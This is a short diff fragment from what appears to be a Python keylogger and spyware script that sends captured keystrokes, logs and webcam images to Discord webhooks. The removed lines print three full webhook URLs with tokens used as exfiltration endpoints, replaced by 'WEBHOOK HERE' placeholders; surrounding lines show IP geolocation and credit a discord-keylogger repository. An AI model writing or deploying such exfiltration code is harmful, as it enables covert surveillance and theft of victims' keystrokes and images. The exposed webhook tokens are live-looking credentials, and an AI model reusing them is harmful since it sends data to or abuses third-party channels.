@@ -59,9 +59,9 @@ lon = ip_info['lon']
 
 timer = 10
 
-keylog_webhook = "https://discord.com/api/webhooks/1039990162458955776/dG9awfUax8tBUWtFYnYt6bJYpXXAVBeHUQwzthqQcOT4yIVG-Xr-AjUikjxdEU6LZ87z"
-log_webhook = "https://discord.com/api/webhooks/1039283621325975635/2tA8bWH3jrsQDBIgzNFijJ423UODJrCpmubR75Po3ODBa7KLIQJd24Qbnm6eCug8weNZ"
-webcam_webhook = "https://discord.com/api/webhooks/1043469886975905812/r3v8QKXe8wW7bY5RAnT3oltEkSKpKyzu1dbCuQ8hoXXwiYRgddcISOwXqzHgTs4olFQe"
+keylog_webhook = "WEBHOOK HERE"
+log_webhook = "WEBHOOK HERE"
+webcam_webhook = "WEBHOOK HERE"
 
 
 # Keylogging Code ( https://github.com/3ct0s/discord-keylogger )
